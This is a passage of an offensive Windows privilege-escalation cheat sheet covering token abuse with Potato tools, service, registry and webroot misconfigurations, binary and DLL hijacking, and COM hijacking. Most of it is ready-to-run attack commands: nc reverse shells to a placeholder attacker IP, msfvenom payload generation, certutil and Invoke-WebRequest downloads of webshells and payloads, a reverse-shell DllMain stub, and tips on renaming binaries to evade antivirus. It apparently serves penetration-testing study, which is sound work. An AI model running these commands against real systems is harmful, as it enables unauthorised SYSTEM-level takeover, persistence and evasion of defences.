> Output is grouped by severity (`HIGH`/`MEDIUM`/`LOW`/`INFO`); start with `HIGH` items — they map directly to the privesc primitives in 4.2-4.21. Priority triage: `whoami /priv` (4.2) → services (4.3) → scheduled tasks (4.6) → stored creds (4.7) → kernel (4.9). **Nothing found?** → check internal services on 127.0.0.1 (port-forward and attack), hunt creds in files/registry (4.7/4.17), or pivot to AD attacks if domain-joined (active-directory-methodology.md).

#### Native Manual Enumeration (No Tools Required)
```powershell
# === IDENTITY & PRIVILEGES ===
whoami /all
net user %USERNAME%
net localgroup Administrators

# === SYSTEM INFO ===  🟢 baseline recon — present in every shell session, not signatured
systeminfo
hostname

# === SERVICES (look for non-standard, writable, or unquoted paths) ===
wmic service get name,displayname,pathname,startmode,startname | findstr /i "auto"
sc query state= all | findstr /i "SERVICE_NAME DISPLAY_NAME STATE"
# PowerShell: Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject Win32_Service | Select-Object Name,StartName,PathName,StartMode | Format-List

# === SCHEDULED TASKS (look for writable scripts running as SYSTEM) ===
schtasks /query /fo LIST /v | findstr /i "TaskName Run Author"
# PowerShell:
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | ForEach-Object { $_ | Get-ScheduledTaskInfo; $_.Actions }

# === INSTALLED SOFTWARE ===
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName DisplayVersion"
# 32-bit apps on 64-bit OS:
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName DisplayVersion"

# === PATCHES ===
wmic qfe list brief

# === NETWORK ===
ipconfig /all
netstat -ano | findstr "LISTENING"
route print
arp -a

# === REGISTRY AUTOLOGON ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"

# === ALWAYS INSTALL ELEVATED ===
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

# === UNQUOTED SERVICE PATHS ===
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """

# === STORED CREDENTIALS ===
cmdkey /list

# === POWERSHELL HISTORY ===
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul

# === SENSITIVE FILES ===
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml C:\*web.config 2>nul
dir /s /b C:\Users\*\Desktop\*.txt C:\Users\*\Documents\*.txt 2>nul
```

### 4.2 Token Privilege Abuse
```powershell
# Check current privileges  🟢 every shell does this — baseline, no signature
whoami /priv
```

| Privilege | Exploit Tool | Notes |
|---|---|---|
| `SeImpersonatePrivilege` | GodPotato, PrintSpoofer, JuicyPotato, JuicyPotatoNG, SweetPotato | Most common on IIS/MSSQL service accounts |
| `SeTcbPrivilege` ("Act as part of the operating system") | TcbElevation PoC | Rare but instant — call `LogonUser` as any account |
| `SeCreateTokenPrivilege` | `NtCreateToken` direct forgery | Almost-never granted; if present, forge an Administrators token outright (see 4.21e) |
| `SeBackupPrivilege` | Manual SAM/SYSTEM dump | Copy protected files (see 4.13) |
| `SeRestorePrivilege` | Service binary overwrite / utilman.exe | Write to protected paths (see 4.20) |
| `SeDebugPrivilege` | Process injection / LSASS dump | Dump LSASS (see 4.18) |
| `SeLoadDriverPrivilege` | Load vulnerable driver (Capcom.sys) | Kernel-level code exec (see 4.21) |
| `SeManageVolumePrivilege` | SeManageVolumeExploit → DLL hijack | Write to System32 (see 4.21b) |
| `SeTakeOwnershipPrivilege` | Take ownership of sensitive files | Access SAM/SYSTEM hives (see 4.19) |
| `SeAssignPrimaryTokenPrivilege` | JuicyPotato / RoguePotato | Token manipulation |
| `SeRelabelPrivilege` | Lower mandatory integrity label on `\Device\PhysicalMemory` / driver objects | Allows promoting low-IL code to System-IL — chain with kernel primitive (see 4.21f) |
| `SeCreateSymbolicLinkPrivilege` | Symlink to System32 / protected file → drop-into-trusted-path | NTFS file-level analogue of junction (§4.3d); symlinks DISABLED for non-admins by default — granted = misconfig (see 4.21g) |
| `SeMachineAccountPrivilege` | Add machine accounts to domain (RBCD, BadSuccessor) | AD attack primitive — pivot to AD methodology |
| `SeEnableDelegationPrivilege` | Set `TrustedToAuthForDelegation` / `TrustedForDelegation` on any account | Held by Domain Admins / Built-in Administrators on DC — confers ability to enable any constrained/unconstrained delegation; effectively DA-equivalent (AD §5) |
| `SeSyncAgentPrivilege` | Direct DRSUAPI replication via `lsadump::dcsync` semantics | Granted to AD replication accounts — equivalent to DCSync rights without explicit ACE (AD §10.1) |
| `SeSecurityPrivilege` | Read/clear Security log; set audit policy | NOT direct LPE — log tampering / audit evasion (chain with engagement RoE; lab targets only) |
| `SeAuditPrivilege` | Generate Security log entries | Used to inject false events / DoS log pipelines; rare on CPTS but flag if seen |
| `SeIncreaseQuotaPrivilege` | Bundled with SeAssignPrimaryToken in some Potato chains | Required by `CreateProcessAsUser` — present in default service token; FullPowers also restores it |
| `SeTrustedCredManAccessPrivilege` | Access Credential Manager as Trusted Caller | Read DPAPI-protected creds for any user without their context (4.15 alt path) |
| **Stripped service-account privs** (only `SeChangeNotify` + `SeCreateGlobal` + `SeIncreaseWorkingSet`) | **FullPowers** — recreates the default service privilege set incl. `SeImpersonate` / `SeAssignPrimaryToken` / `SeIncreaseQuota` | Apply when running as `LOCAL SERVICE` / `NETWORK SERVICE` post-RCE; then chain into a Potato variant |

> **If `whoami /priv` shows only `SeChangeNotifyPrivilege` + `SeIncreaseWorkingSetPrivilege` (and possibly `SeMachineAccountPrivilege`):**
> This is the minimal domain user set — no local privesc path via token abuse.
> Shift focus entirely to AD attack paths:
> - `SeMachineAccountPrivilege` present → can create machine accounts → check for RBCD or dMSA opportunities (AD Phase 5.3 / 5.4)
> - Enumerate ACLs with BloodHound or PowerView — the privesc path is through AD, not local privileges
> - Check `sudo -l` equivalent: `net localgroup Administrators`, `net localgroup "Remote Management Users"`

**Potato variant decision matrix** — pick by OS and required privilege:

| Variant | SeImpersonate | SeAssignPrimaryToken | OS range | Notes |
|---|---|---|---|---|
| Juicy Potato (ohpe) | ✓ | ✓ | ≤ Win10 1803 / Server 2016 | Dead on 1809+ — DCOM OXID patched |
| RoguePotato | ✓ | ✗ | All modern | Needs outbound TCP 135 + fake OXID resolver |
| PrintSpoofer | ✓ | ✓ | Server 2016/2019/2022 | Requires Spooler running |
| JuicyPotatoNG | ✓ | ✗ | Server 2019/2022, Win 10/11 | Resurrects JP via different CLSIDs (port 10247) |
| GodPotato | ✓ | ✗ | Server 2012-2022, Win 8.1-11 | Works on most modern targets; pick `-NET2/-NET35/-NET4` to match .NET |
| SigmaPotato | ✓ | ✗ | All modern | .NET reflection variant — AV-evasive |
| SweetPotato | ✓ | ✗ | Mixed (multi-technique) | Tries several approaches; useful when one fails |
| EfsPotato | ✓ | ✗ | All with MS-EFSR | Alt path when DCOM/Spooler blocked |

> **Decision rule:** if `SeImpersonate` is present → try GodPotato first (broadest OS support, no Spooler dep). If `SeAssignPrimaryToken` only → PrintSpoofer (needs Spooler).

```bash
# GodPotato — broadest OS support; choose binary matching target .NET version
# 🟡 Potato variants create distinctive named pipes (e.g. \\.\pipe\<random>) + RPC OXID resolver patterns — Sigma "Potato" rules + Sysmon EID 17/18 (PipeCreate/PipeConnect) match. Defender flags the binary name "GodPotato"/"PrintSpoofer" — rename before drop.
# https://github.com/BeichenDream/GodPotato
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"

# PrintSpoofer — needs Spooler; only path that honors SeAssignPrimaryToken without SeImpersonate
# https://github.com/itm4n/PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell.exe

# JuicyPotatoNG — modern OS resurrection of original JP
# https://github.com/antonioCoco/JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p "C:\temp\nc.exe" -a "<ATTACKER_IP> <PORT> -e cmd.exe"

# SweetPotato — multi-technique fallback
# https://github.com/CCob/SweetPotato
.\SweetPotato.exe -p C:\temp\nc.exe -a "-e cmd.exe <ATTACKER_IP> <PORT>"
```

#### Recover Service-Account Privileges — FullPowers (`LOCAL SERVICE` / `NETWORK SERVICE` with stripped privs)
```powershell
# Use when: post-RCE shell as a service account whose `whoami /priv` is missing SeImpersonate / SeAssignPrimaryToken
# (e.g. spawned via WSH, child of svc, or any path that drops the default service privilege set).
# FullPowers re-spawns under a scheduled task with the full default service token, restoring SeImpersonate + SeAssignPrimaryToken.
# https://github.com/itm4n/FullPowers

# 1. Drop FullPowers.exe via your preferred file-transfer (see file-transfers.md)
iwr http://<ATTACKER_IP>:<ATTACKER_PORT>/FullPowers.exe -OutFile FullPowers.exe

# 2. Run — opens an interactive cmd with the recovered privileges
.\FullPowers.exe
# Inside the new shell:
whoami /priv         # confirm SeImpersonate is back

# 3. Chain into a Potato variant — see GodPotato/PrintSpoofer/JuicyPotatoNG above
.\GodPotato-NET4.exe -cmd "cmd /c <YOUR_PAYLOAD>"
```

#### SeTcbPrivilege Exploitation
```powershell
# SeTcbPrivilege ("Act as part of the operating system") = call LogonUser() as any local account → spawn process as them.
# Holders are usually services running as LOCAL SYSTEM equivalents that lost SeImpersonate but kept SeTcb.
# PoC: TcbElevation (compile or download precompiled) — adds your account to local Administrators and re-spawns.

# Compile from source (mingw on attacker):
x86_64-w64-mingw32-g++ TcbElevation.cpp -o TcbElevation-x64.exe -lsecur32 -municode

# Run on target — the inner command executes with TCB-elevated context:
.\TcbElevation-x64.exe elevate 'net localgroup Administrators <USER> /add'

# Verify
net localgroup Administrators
```

### 4.3 Service Misconfigurations

#### Unquoted Service Paths
```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
If path is `C:\Program Files\My App\service.exe`, place payload at `C:\Program.exe` or `C:\Program Files\My.exe`.

#### Weak Service Permissions
```powershell
# Check service permissions (accesschk from Sysinternals)
accesschk.exe /accepteula -uwcqv "<USERNAME>" *

# NATIVE ALTERNATIVE (no accesschk): query service config and check binary path permissions
sc qc <SERVICE_NAME>
icacls "C:\path\to\service.exe"

# PowerShell native: check all services and their binary paths
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"','' -split ' ' | Select-Object -First 1
    if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        if ($acl) { Write-Output "$($_.Name) → $path"; $acl.Access | Where-Object {$_.FileSystemRights -match "Write|Full|Modify"} }
    }
}

# If SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS:
sc config <SERVICE_NAME> binpath= "C:\temp\shell.exe"
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>

# Check modifiable service binaries
accesschk.exe /accepteula -wvu "C:\path\to\service.exe"
# NATIVE: icacls achieves the same
icacls "C:\path\to\service.exe"
# Look for (M), (W), or (F) for your user/group
```

#### Weak Registry Permissions
```powershell
# Check if registry key for service is writable
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\Services

# NATIVE ALTERNATIVE: PowerShell registry ACL check
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE>" | Format-List
# Look for your user/group with FullControl or SetValue

# Enumerate all service registry keys for writable ones (PowerShell native)
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object {
    $acl = Get-Acl $_.PSPath -ErrorAction SilentlyContinue
    $acl.Access | Where-Object {$_.RegistryRights -match "FullControl|SetValue" -and $_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller"} | ForEach-Object {
        Write-Output "$($_.IdentityReference) → $($acl.Path)"
    }
}

# Modify ImagePath if writable
reg add HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE> /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
```

#### Service ACL Grants Start Only — Arbitrary File Write via CLI Argument

> **Primitive:** A non-default service runs as SYSTEM. Its SDDL grants your user `Start` (RP) but NOT `ChangeConfig` (CC) or write-access to the binary. The binary itself accepts a path argument it writes to as SYSTEM. `sc start <SVC> <path>` becomes a write-as-SYSTEM oracle. Different from the §4.3 weak-perms case which assumes `binPath=` swap.

```powershell
# === DISCOVERY — non-default services (skip Microsoft-signed) ===
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike '*Windows*' -and $_.PathName -notlike '*Program Files*Common*'
} | Select Name, StartName, PathName, State

# === CHECK ACL — does CURRENT user have Start (RP) right? ===
sc sdshow <SERVICE_NAME>
# ACE chars for service control:
#   RP = start, WP = stop, DT = pause, LO = interrogate, CC = change config
# Look for an A;; entry ending in your SID

# Get current user SID for SDDL parsing
whoami /user
# ACE-string reference: https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings

# Native PowerShell SDDL parse — find services where current user has RP but not CC
$mySid = (whoami /user) -split '\s+' | Select-String -Pattern 'S-1-5' | ForEach-Object { $_.Matches.Value }
Get-WmiObject Win32_Service | ForEach-Object {
    $sd = (sc.exe sdshow $_.Name) -join ''
    if ($sd -match $mySid -and $sd -match 'RP' -and $sd -notmatch 'CC.*' + $mySid) {
        Write-Output "$($_.Name) → $($_.PathName) [RP only]"
    }
}
```

```powershell
# === REVERSE BINARY BEHAVIOR (analysis VM, NOT target) ===
# Copy the target binary to throwaway VM first
sc create AnalysisSvc binPath= "C:\users\<USER>\<TARGET>.exe"

# Run Procmon (Sysinternals) — Filter: Process Name is <TARGET>.exe → Include
# https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

# Probe with various args, watch CreateFile/WriteFile events
sc start AnalysisSvc                                  # baseline — no args
sc start AnalysisSvc C:\users\<USER>\test             # single path arg
sc start AnalysisSvc C:\Windows\System32\poc          # observe extension append
```

```powershell
# === CONFIRM PRIMITIVE ON TARGET — write to controlled location first ===
sc start <SERVICE_NAME> C:\ProgramData\test
dir C:\ProgramData\test*
# If a file appears that current user couldn't have created → service is your write-as-SYSTEM oracle

# Probe sensitive path — check if extension is appended
sc start <SERVICE_NAME> C:\Windows\System32\<NAME>
dir C:\Windows\System32\<NAME>*
# Expect <NAME>.<ext> created as SYSTEM in System32
```

```powershell
# === CONVERT WRITE → RCE ===
# Chain A: drop .bat into scheduled-task spool that runs as SYSTEM/admin (see §4.6)
# Chain B: overwrite a DLL that a side-loaded process loads (see §4.4 DLL Hijacking)
# Chain C: DiagHub COM service DLL load — arbitrary DLL load via ITaskService COM
# https://posts.specterops.io/abusing-diaghub-c2622e30c3b5

# If extension appended (e.g., .log, .txt), look for a sibling service that uses raw arg
# DLL hijack requires writing <DLLNAME>.dll exactly — extension append breaks this chain

# === ENGAGEMENT HYGIENE ===
# - Log every file path the service writes (IOC list for engagement report)
# - Pick novel filenames in System32 — never overwrite existing files
# - Stop the service when done
sc stop <SERVICE_NAME>
```

> **OPSEC:** `sc sdshow`, `sc start <SVC> <path>`, and `Win32_Service` enumeration are noisy on EDR with service-config telemetry. The Procmon reversing step is offline (analysis VM); on-target probing should write to `C:\ProgramData\` or `%TEMP%` first to validate the primitive before touching System32.

> **LOTL caveat:** `sc.exe` is a signed Microsoft binary; `Get-WmiObject Win32_Service` is native PowerShell. No external tools needed for discovery or exploitation — the chain is fully LOLBins.

---

### 4.3b Writable Webroot Served by SYSTEM Service

When a local web stack (WAMP/XAMPP/Apache/IIS/Tomcat) runs as `LocalSystem` and the docroot ACL grants `BUILTIN\Users` write — drop a webshell, request it via the listening service, code executes as SYSTEM. Same misconfig family as service-binary-hijack, except the writable artifact is a content file rather than the binary.

```cmd
:: Enumerate web services and their start account
net start
net start | findstr /i "wamp xampp apache mysql nginx tomcat iis w3svc"
sc query state= all | findstr /i "SERVICE_NAME"

:: Confirm service runs as SYSTEM (SERVICE_START_NAME : LocalSystem)
sc qc <SERVICE_NAME>
:: BINARY_PATH_NAME shows install dir (e.g. C:\wamp64\bin\apache\...\httpd.exe)
```

```cmd
:: Walk common docroots
dir C:\wamp64\www
dir C:\xampp\htdocs
dir C:\inetpub\wwwroot
dir "C:\Program Files\Apache Software Foundation\Tomcat*\webapps"
dir "C:\Program Files (x86)\Apache Software Foundation\Tomcat*\webapps"

:: Check ACLs — winning condition: BUILTIN\Users has (AD)/(WD)/(M)/(W)/(F)
icacls C:\wamp64\www
icacls C:\xampp\htdocs
icacls C:\inetpub\wwwroot
```

> **icacls codes:** `(AD)` append-data, `(WD)` write-data, `(M)` modify, `(W)` write, `(F)` full. See 4.6 quick-reference for the full table.

#### Living-off-the-land alternative — PowerShell native webroot scan
```powershell
# Scan likely roots for writable web-served dirs as the current user
Get-ChildItem 'C:\','C:\inetpub','C:\Program Files','C:\Program Files (x86)' -Directory -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -match 'www|htdocs|webapps|wwwroot' } |
  ForEach-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    $acl.Access | Where-Object {
      $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
      $_.FileSystemRights -match 'Write|Modify|FullControl'
    } | ForEach-Object {
      Write-Output "WRITABLE WEBROOT: $($_.IdentityReference) on $($acl.Path) -> $($_.FileSystemRights)"
    }
  }
```

Drop a webshell matching the engine — PHP for WAMP/XAMPP, ASPX for IIS, JSP for Tomcat.

```powershell
# PHP — WAMP/XAMPP (CLM-safe native download)
Invoke-WebRequest http://<ATTACKER_IP>:<ATTACKER_PORT>/shell.php -OutFile C:\wamp64\www\shell.php

# ASPX — IIS
Invoke-WebRequest http://<ATTACKER_IP>:<ATTACKER_PORT>/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx

# JSP — Tomcat
Invoke-WebRequest http://<ATTACKER_IP>:<ATTACKER_PORT>/shell.jsp -OutFile "C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\shell.jsp"
```

```cmd
:: certutil fallback when PowerShell is locked down
certutil -urlcache -split -f http://<ATTACKER_IP>:<ATTACKER_PORT>/shell.php C:\wamp64\www\shell.php
```

Trigger via the listening web service — runs as the service account (SYSTEM if confirmed at step 2).

```bash
# From attacker — request the webshell
curl "http://<TARGET>/shell.php?cmd=whoami"
# Expected: nt authority\system

# Stage a SYSTEM reverse shell — execute the AV-evaded payload already on disk
curl "http://<TARGET>/shell.php?cmd=C:\Users\Public\<PAYLOAD_BINARY>.exe"
# Catch on listener
rlwrap nc -lnvp <ATTACKER_PORT>
```

> **OPSEC:** Webshell drop is loud — pick a non-obvious filename (avoid `shell.php`). Apache/IIS/Tomcat access logs WILL record both the drop and the trigger requests; coordinate with the detection team on Purple engagements. Some web services run as `NetworkService` rather than full SYSTEM — confirm with `whoami` after first trigger.

> **LOTL caveat:** This is the same misconfig family as `4.3 Service Misconfigurations` (writable service binary). The privilege boundary is the same — a non-admin user writes a file that a SYSTEM-context process loads/executes — the difference is that the writable artifact is *content the service serves* rather than *the service binary itself*. Detection logic should cover both: file-write to known docroots by non-service users, plus the subsequent HTTP request that triggers it.

---

### 4.3c Service Spawns Auxiliary Binary from Writable Directory (Sibling-Binary Hijack)

Distinct from §4.3 binpath replacement and unquoted paths: the registered service binary is correct and read-only, but the service launches a *helper / sibling* EXE from a directory the current user (or `BUILTIN\Users`) can write to — typically a third-party vendor dir under `C:\ProgramData\` or `C:\Program Files\<VENDOR>\`. Drop a same-named replacement, restart the service, shell returns as `NT AUTHORITY\SYSTEM`.

#### Sweep ProgramData / Program Files for writable vendor dirs
```powershell
# PowerShell — flag dirs writable by Users / Everyone / Authenticated Users
Get-ChildItem -Path C:\ProgramData,'C:\Program Files','C:\Program Files (x86)' -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    $bad = $acl.Access | Where-Object {
        $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
        $_.FileSystemRights -match 'Write|Modify|FullControl|CreateFiles'
    }
    if ($bad) { [pscustomobject]@{ Path=$_.FullName; Identity=($bad.IdentityReference -join ','); Rights=($bad.FileSystemRights -join ',') } }
}
```

```cmd
:: cmd.exe equivalent (ConstrainedLanguage / AppLocker friendly)
for /f "delims=" %d in ('dir /b /ad C:\ProgramData') do @icacls "C:\ProgramData\%d" 2>nul | findstr /i "BUILTIN\\Users:.*(.*W" && echo [WRITABLE] C:\ProgramData\%d

:: Confirm a single candidate — look for (WD), (M), or (F)
icacls "C:\ProgramData\<VENDOR_DIR>"
```

#### Identify the service that touches that dir
```powershell
# Map running services to binary paths under the writable dir
Get-WmiObject Win32_Service | Where-Object { $_.PathName -match '<VENDOR_DIR>' } | Select-Object Name,DisplayName,StartName,PathName,State

# Confirm SYSTEM context and stop/start permissions
Get-Service '<SERVICE_NAME>' | Format-List *
# Look for: Status=Running, CanStop=True, StartName=LocalSystem
```

```bash
# Many vendor services hit by this are public CVEs — check before custom-building
searchsploit <VENDOR> <PRODUCT>
```

#### Enumerate the child binary the service launches
```powershell
# Method 1 — wmic snapshot of children for the running service PID
wmic process where "ParentProcessId=<SERVICE_PID>" get Name,ExecutablePath,CommandLine

# Method 2 — tight poll across stop/start to catch short-lived spawns
while ($true) { Get-WmiObject Win32_Process | Where-Object { $_.ParentProcessId -eq <SERVICE_PID> } | Select-Object Name,ExecutablePath,CommandLine; Start-Sleep -Milliseconds 200 }

# Method 3 — application event log often complains when expected helper is missing
Get-EventLog -LogName Application -Source '<VENDOR>*' -Newest 50 | Format-List Message
```

#### Build malicious replacement (Linux attacker — cross-compile)
```bash
# Match architecture (x86 vs x64) of the service host
file <legitimate-binary-pulled-via-smb-or-http>

# C reverse-shell (see av-evasion.md for renamed/stripped variants)
x86_64-w64-mingw32-g++ revshell.cpp -o <CHILD_BINARY_NAME>.exe -lws2_32 -s -ffunction-sections -fdata-sections -static-libstdc++ -static-libgcc
i686-w64-mingw32-g++ revshell.cpp -o <CHILD_BINARY_NAME>.exe -lws2_32 -s

# Or msfvenom EXE if AppLocker doesn't block ProgramData execution (see §4.11)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe -o <CHILD_BINARY_NAME>.exe
```

#### Plant + trigger
```powershell
# Drop replacement using SAME basename the service invokes (see file-transfers.md for OPSEC alternatives)
certutil -urlcache -split -f http://<ATTACKER_IP>/<CHILD_BINARY_NAME>.exe C:\ProgramData\<VENDOR_DIR>\<CHILD_BINARY_NAME>.exe

# Bounce the service — may need a couple of cycles to fire the helper path
Stop-Service '<SERVICE_NAME>'
Start-Sleep 3
Start-Service '<SERVICE_NAME>'
```

```cmd
:: If Stop-Service is blocked by CLM/AppLocker
sc.exe stop <SERVICE_NAME>
sc.exe start <SERVICE_NAME>
```

```bash
# Listener on attacker — shell returns as NT AUTHORITY\SYSTEM
nc -lvnp <ATTACKER_PORT>
```

> **OPSEC:** Service-stop generates 7036 in System log; vendor service spawning unexpected EXE that calls out to attacker IP is a high-signal IOC. Match basename of the legitimate helper and host the dropper on attacker-controlled :443 to blend.

> **Disambiguation:** Distinct from §4.3 binpath replacement (`sc config binpath=` rewrites the *registered* binary) and unquoted-service-path (abuses Windows' space-tokenized path resolution). Here the registered binpath is correct — the bug is that the service's own binary spawns a helper from a writable location.

---

### 4.3d NTFS Junction — Redirect Writable Path → Webroot / Protected Dir

When a service or web-app writes uploads / output into a directory you control, but the *served* webroot is owned by a higher-privilege account — replace your writable subdir with an NTFS **junction** (directory symlink) pointing at the webroot. The next write follows the junction and lands inside the protected directory.

Common chain (Media-style): web-app saves uploads to `C:\Windows\Tasks\Uploads\<HASH>\` where `<HASH> = md5(firstname + lastname + email)` or similar deterministic value. Attacker controls the hash inputs → predicts the path → deletes the dir → replaces it with a junction to `C:\xampp\htdocs\` → uploads `cmd.php` → browses `http://target/cmd.php` for RCE as the web-server account.

```cmd
:: 1. Predict / observe the upload path
::    (read source code, leak the path-builder function, or just upload once and watch where it lands)
dir C:\windows\tasks\uploads

:: 2. Confirm Apache/IIS/etc webroot is writable by the SAME service account that owns the upload path
icacls C:\xampp\htdocs

:: 3. Delete YOUR controlled subdir, then create the junction in its place
::    cmd.exe — mklink /J  (also: /D = soft link to dir, /H = hard link to file)
rmdir /S /Q C:\windows\tasks\uploads\<HASH>
mklink /J C:\windows\tasks\uploads\<HASH> C:\xampp\htdocs

:: PowerShell equivalent
Remove-Item -Recurse -Force C:\Windows\Tasks\Uploads\<HASH>
New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\<HASH>" -Target "C:\xampp\htdocs"

:: 4. Re-upload — file lands in webroot. Browse it for RCE.
```

```cmd
:: Alternate variants — same primitive, different sinks
::   redirect log-tail target into System32 / Tasks / Startup folder
::   redirect "user-data" dir into another user's profile (read their files at next service write)
::   redirect into Sysmon/PerfLogs/Temp paths watched by an admin scheduled task
mklink /J <CONTROLLED_DIR> "C:\Users\<TARGET_USER>\Desktop"
mklink /J <CONTROLLED_DIR> "C:\ProgramData\<APP>\sensitive"
```

> **Why this works:** NTFS junctions are evaluated by the kernel at every path traversal. The service / web-app stat()-equivalent has no idea the directory it's writing into is a redirect — it just opens the path and writes. ACL checks happen against the *destination* using the *service's* token, not your token, so any path the service can already write to becomes your write target.
>
> **Detection / hardening:** ACLs on the parent (`C:\Windows\Tasks\Uploads\` in the Media case) should not grant the web account `FILE_DELETE_CHILD` — without it, the attacker can't `rmdir` their own subdir to replace it. Code-level fix: validate that the resolved path stays under the intended root via `GetFullPathName` + prefix check.

---

### 4.4 DLL Hijacking
```powershell
# Use Process Monitor to find missing DLLs (if you can upload it)
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# NATIVE ALTERNATIVE: identify DLL search order issues without ProcMon
# 1. Check which DLLs a service/binary loads
# cmd.exe (no tools):
where /r C:\Windows\System32 <BINARY_NAME>.exe
# Check the binary's import table (if you have PowerShell):
# Look for DLLs in the application directory that are writable
icacls "C:\Program Files\<APP>\" | findstr /i "(M) (W) (F)"

# 2. Check PATH environment variable for writable directories
echo %PATH%
# Check each directory in PATH for write permissions:
for %p in ("%PATH:;=" "%") do @icacls %p 2>nul | findstr /i "(M) (W) (F)" && echo [WRITABLE] %p

# 3. PowerShell: find writable directories in PATH
$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { $acl = Get-Acl $_; $acl.Access | Where-Object {$_.FileSystemRights -match "Write|Modify|Full"} | ForEach-Object { Write-Output "WRITABLE: $_ → $($_.IdentityReference)" } } }

# Generate malicious DLL (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijack.dll

# NATIVE DLL compilation (if you have access to csc.exe on target — no msfvenom needed)
# Create C# source that compiles to DLL:
# See LOLBins: https://lolbas-project.github.io
```

#### 4.4b Custom mingw DLL with DllMain Stub (AV-evading DLL Hijack Payload)

When msfvenom-generated DLLs get flagged, compile a minimal C DLL stub on the attacker box that executes a command in `DLL_PROCESS_ATTACH`. Smaller, no msfvenom signatures, trivially customizable.

```c
/* hijack.c — compile with mingw on attacker, drop as the missing DLL name */
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c C:\\Windows\\Temp\\nc.exe <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe");
        /* Or: WinExec("powershell -ep bypass -enc <BASE64_PAYLOAD>", 0); */
    }
    return TRUE;
}
```

```bash
# Cross-compile on Kali — x64
x86_64-w64-mingw32-gcc hijack.c -o <MISSING_DLL_NAME>.dll -shared -lws2_32 -s

# x86 variant
i686-w64-mingw32-gcc hijack.c -o <MISSING_DLL_NAME>.dll -shared -lws2_32 -s

# Proxy DLL — forward all exports to the real DLL so the app doesn't crash
# Add #pragma comment(linker, "/export:<FUNC_NAME>=<REAL_DLL>.<FUNC_NAME>") per export
# Use 'dumpbin /exports <REAL_DLL>.dll' (MSVC) or 'winedump -j export <REAL_DLL>.dll' on Kali
```

#### Living-off-the-land / LOTL variant

```powershell
# On-target C# compilation via csc.exe (no file transfer of a DLL needed)
$src = @'
using System;
using System.Runtime.InteropServices;
public class Init {
    [DllExport("DllMain", CallingConvention.StdCall)]
    public static bool DllMain(IntPtr hModule, uint reason, IntPtr lpReserved) {
        if (reason == 1) { System.Diagnostics.Process.Start("cmd.exe", "/c C:\\Windows\\Temp\\payload.exe"); }
        return true;
    }
}
'@
$src | Out-File C:\Windows\Temp\hijack.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:C:\Windows\Temp\<MISSING_DLL_NAME>.dll C:\Windows\Temp\hijack.cs
# Note: pure csc.exe cannot produce unmanaged DLL exports without DllExport NuGet; use managed DLL load chains or compile offline with mingw
```

#### 4.4c COM/CLSID InprocServer32 Registry Hijack

Distinct from DLL search-order abuse: target a COM CLSID whose `InprocServer32` registry key has weak ACLs, redirect it to an attacker DLL. When any process (including SYSTEM services) `CoCreateInstance` that CLSID, your DLL loads in their context.

```powershell
# === Enumerate CLSIDs with writable InprocServer32 keys ===
Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.PSChildName -eq 'InprocServer32' } |
  ForEach-Object {
    $acl = Get-Acl $_.PSPath -ErrorAction SilentlyContinue
    $bad = $acl.Access | Where-Object {
      $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
